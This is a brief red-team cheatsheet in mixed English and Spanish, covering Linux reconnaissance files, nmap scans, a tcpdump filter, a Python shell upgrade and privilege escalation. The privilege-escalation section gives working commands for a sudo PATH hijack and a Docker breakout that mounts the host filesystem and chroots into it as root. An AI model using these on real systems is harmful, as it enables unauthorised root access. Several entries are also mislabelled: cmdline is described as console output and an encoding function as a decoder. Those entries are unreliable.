# Red Team Cheatsheet
Useful Cheatsheet for Red Team Engagements

# Linux 

## Directorios y Archivos utiles
Listening ports in Hex format\
```/proc/net/tcp```

General System Information\
```/proc/sched_debug```

Console Output of a process \
```/proc/{PID}/cmdline```

Force Core Dump\
```kill -SIGSEGV 2373```

Kernel Memory Dumps\
```/var/crash/```

## Commands

Reeplace \n with real line breaks\
```sed 's/\\n/\n/g'```

Unpack Crash report Kernel\
```apport-unpack```

List executable files with sudo\
```sudo -l```


## Python 
Upgrade Shell\
```python3 -c 'import pty; pty.spawn("/bin/bash")'```

Decode Requests responses\
```urllib.parse.quote('/')```

# Nmap

Quick Scan\
```nmap  -p-  --min-rate=1000 -T4```

Deep Scan\
```nmap -sS -A -sC -sV -p- --min-rate 5000```

# Tcpdump

Capture ICMPv6 and DHCPv6 traffic\
```tcpdump -i <interface name> -n -vv '(udp port 546 or 547) or icmp6'```

# Privilege Escalation

Users with:\
`(root) SETENV: NOPASSWD:`\
Create own binary and ejecute as root:\
```sudo PATH=$PWD:$PATH [Binario con privilegios en sudo -l]```

Docker Breakout\
```docker run -v /:/mnt --rm -it alpine chroot /mnt sh```

